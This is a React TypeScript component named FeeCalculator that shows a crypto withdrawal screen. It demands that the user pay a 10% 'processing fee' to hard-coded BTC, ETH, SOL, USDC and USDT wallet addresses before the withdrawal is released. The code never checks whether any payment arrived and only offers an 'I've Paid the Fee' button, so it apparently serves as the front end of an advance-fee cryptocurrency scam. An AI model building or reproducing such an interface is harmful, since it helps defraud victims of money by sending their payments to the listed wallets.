import React from 'react';
import { Calculator, ArrowRight, ArrowLeft, AlertTriangle } from 'lucide-react';
import Button from '../UI/Button';

interface FeeCalculatorProps {
  amount: number;
  currency: string;
  onConfirm: () => void;
  onBack: () => void;
}

const FeeCalculator: React.FC<FeeCalculatorProps> = ({ amount, onConfirm, onBack }) => {
  const feePercentage = 10;
  const feeAmount = amount * (feePercentage / 100);

  const formatCurrency = (value: number) => {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD'
    }).format(value);
  };

 const walletAddresses = {
  BTC: '1N4wen6Nk9yhmrueWSZXUePgCYbb7FtQhe',
  ETH: '0x5c44e4f4f9251f43d647f5c8a7b799bb480bd674',
  SOL: '8heKVhbgo64xW31s7dzVkGPkubHmEWtJZYMYYKWGHJYA',
  USDC: '8heKVhbgo64xW31s7dzVkGPkubHmEWtJZYMYYKWGHJYA',
  USDT: 'TPSEjSZksyBrVy3vo4Q5kggKudGu1JCWqH'
};
  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    // Toast notification would go here
  };

  return (
    <div className="bg-slate-800 border border-slate-700 rounded-2xl p-8 animate-slide-up">
      {/* Header */}
      <div className="flex items-center mb-6">
        <div className="p-3 bg-yellow-500/10 rounded-xl mr-4">
          <Calculator className="w-6 h-6 text-yellow-400" />
        </div>
        <div>
          <h2 className="text-xl font-semibold text-white">Fee Calculation</h2>
          <p className="text-slate-400 text-sm">Review withdrawal fees and payment details</p>
        </div>
      </div>

      {/* Fee Breakdown */}
      <div className="bg-slate-700/30 border border-slate-600/50 rounded-xl p-6 mb-6">
        <h3 className="font-semibold text-white mb-4">Processing Fee</h3>
        <div className="space-y-3">
          <div className="flex justify-between">
            <span className="text-slate-300">Withdrawal Amount:</span>
            <span className="text-white font-medium">{formatCurrency(amount)}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-slate-300">Processing Fee ({feePercentage}%):</span>
            <span className="text-yellow-400 font-medium">{formatCurrency(feeAmount)}</span>
          </div>
          <hr className="border-slate-600" />
          <div className="text-sm text-slate-300 italic">
            After you pay the fee, your withdrawal of <span className="text-neon-green font-semibold">{formatCurrency(amount)}</span> will be processed.
          </div>
        </div>
      </div>

      {/* Fee Payment Instructions */}
      <div className="bg-yellow-500/5 border border-yellow-500/20 rounded-xl p-6 mb-6">
        <div className="flex items-start">
          <AlertTriangle className="w-5 h-5 text-yellow-400 mr-3 mt-0.5 flex-shrink-0" />
          <div>
            <h4 className="font-medium text-yellow-400 mb-2">Fee Payment Required</h4>
            <p className="text-slate-300 text-sm mb-4">
              You must pay the {feePercentage}% processing fee ({formatCurrency(feeAmount)}) before your withdrawal can be processed. 
              Choose any of the supported cryptocurrencies below to pay the fee.
            </p>
          </div>
        </div>
      </div>

      {/* Fee Payment Addresses */}
      <div className="mb-6">
        <h4 className="font-medium text-white mb-4">Pay Processing Fee To:</h4>
        <div className="space-y-3">
          {Object.entries(walletAddresses).map(([crypto, address]) => (
            <div key={crypto} className="bg-slate-700 border border-slate-600 rounded-xl p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="font-medium text-white">{crypto}</span>
                <button
                  onClick={() => copyToClipboard(address)}
                  className="px-3 py-1 bg-neon-green/10 hover:bg-neon-green/20 text-neon-green text-xs rounded-lg transition-colors"
                >
                  Copy Address
                </button>
              </div>
              <p className="text-slate-300 font-mono text-xs break-all">{address}</p>
            </div>
          ))}
        </div>
      </div>

      {/* Actions */}
      <div className="flex space-x-4">
        <Button 
          variant="secondary" 
          onClick={onBack}
          icon={ArrowLeft}
          className="flex-1"
        >
          Back
        </Button>
        <Button 
          onClick={onConfirm}
          icon={ArrowRight}
          className="flex-1"
        >
          I've Paid the Fee
        </Button>
      </div>
    </div>
  );
};

export default FeeCalculator;